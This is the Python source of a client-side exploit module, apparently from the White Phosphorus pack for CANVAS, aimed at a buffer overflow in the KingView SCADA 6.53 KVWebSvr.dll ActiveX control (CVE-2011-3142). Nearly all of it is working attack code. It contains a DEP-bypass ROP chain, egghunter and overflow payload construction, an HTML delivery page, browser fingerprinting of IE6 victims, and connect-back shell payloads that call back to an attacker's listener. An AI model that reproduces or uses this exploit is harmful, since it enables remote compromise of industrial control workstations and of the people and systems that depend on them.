
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

from pelib import PElib

######################################################################################
NAME = "KingView SCADA v6.53 KVWebSvr.dll Activex Overfow"
DESCRIPTION = "A remote overflow in the KingView SCADA v6.53 KVWebSvr.dll ActiveX Control"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='WellinTech Inc'
DOCUMENTATION["Date public"] = "2011-03-07"
DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/72889"
DOCUMENTATION["Repeatability"] = "Unlimited"                     
DOCUMENTATION['CVE'] = "CVE-2011-3142"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3142'
DOCUMENTATION['CVSS'] = '6.8'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - so use it via clientd or httpserver.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
This is a client-side exploit - so use it via clientd or httpserver.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> KingView SCADA v6.53 KVWebSvr.dll Activex Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal (DEP)

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_kingviewscada_kvwebsvr/wp_kingviewscada_kvwebsvr.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################


# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (DEP)", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True
        self.alignstack = True
        self.badstring = "\x00\x09\x0a\x0b\x0c\x0d\x22\x5c"
        
        #Ranomisze name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"       
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, returns a value used to rank the exploit within attacking modules
        """
        Check for IE 6
        """
        self.isClientD = True
        if "MSIE 6.0" in info_dict['user_agent']:
            self.log("WP> Target has MSIE 6")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if self.isClientD:    
            if self.useSSLMOSDEF:
                self.DEFAULT_PAYLOAD = 1
            else:
                self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def buildBypass(self, search = False):
        depBp = pack('<L', 0x1F701F31)  # pop eax
        depBp += pack('<L', 0x1F72E644) # writeable
        depBp += pack('<L', 0x10034C91) # xor ecx, ecx
        depBp += pack('<L', 0x1F701F31) # pop eax
        depBp += pack('<L', 0xFFFFFFC0)
        depBp += pack('<L', 0x1001862A) # neg eax
        depBp += pack('<L', 0x1002E3C9) # xchg ecx, eax
        depBp += wp_randomstring(4)
        depBp += pack('<L', 0x1F70A7CC) # pop edx
        depBp += wp_randomstring(12)
        depBp += pack('<L', 0xFFFFEFFF)
        depBp += pack('<L', 0x100281E6) # neg edx
        depBp += wp_randomstring(8)      
        depBp += pack('<L', 0x1001DBA6) # mov eax, edx / ret 4
        depBp += wp_randomstring(16)
        depBp += pack('<L', 0x10017D50) # pop esi
        depBp += wp_randomstring(4)
        depBp += pack('<L', 0x10024B73) # pop esi / pop edi
        depBp += pack('<L', 0x10030F5A) # mov ebx, eax / call esi
        depBp += pack('<L', 0x1F711346) # edi - pop eax / ret
        depBp += pack('<L', 0x10017D50) # pop esi
        depBp += pack('<L', 0x1003B0E4) # VirtualProtect
        if search:
            depBp += pack('<L', 0x1F701F31) # pop eax
            depBp += pack('<L', 0xFFFFF7FF) # -801
            depBp += pack('<L', 0x1002B5B2) # add ebx, eax
        depBp += pack('<L', 0x1001063C) # pop ebp
        depBp += pack('<L', 0x1F707DAE) # ebp - call [eax] / ret
        depBp += pack('<L', 0x1F701F31) # pop eax
        depBp += pack('<L', 0x1001049A) # push esp / ret 8
        depBp += pack('<L', 0x10037D4B) # pushad
        depBp += "\x83\xEC\x05"         # sub esp, 5
        return depBp

    def makefile(self):
        self.log("WP> Generating Universal DEP Bypass")
        searchBypass = self.buildBypass(search = True)
        self.log("WP> Universal DEP Bypass Size: %s bytes"%len(searchBypass))
        
        searchcode =  wp_SearchCode(True, "mov $0x01991111, %edx")
        
        self.shellcode = self.shellcode[:17] + "\x8B\xE0" + self.shellcode[19:]
        randomStr = "".join( [ random.choice(string.lowercase) for x in range(8) ] )
                
        payload = wp_randomstring(628)
        payload += pack('<L', 0x1F7052F6) # add esp, 7D0
        payload += wp_randomstring(364)
        payload += pack('<L', 0x1F701029)*10
        payload += searchBypass
        payload += searchcode
        payload += wp_randomstring((4096 - len(payload)))
        payload += 'c00kc00k'
        payload += self.buildBypass()
        payload += self.shellcode
        payload += wp_randomstring((10741 - len(payload)))
        
        #Base filedata
        filedata="""<html>
<object classid='clsid:F31C42E3-CBF9-4E5C-BB95-521B4E85060D' id='target'/></object>
<script language='javascript'>
arg1 = "RANDOMSTR";
arg2 = "PAYLOAD";
target.ValidateUser(arg1, arg2);
</script>
</html>
"""
        filedata = filedata.replace('RANDOMSTR', randomStr)
        filedata = filedata.replace('PAYLOAD', payload)
        
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
    
        #self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h,b

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
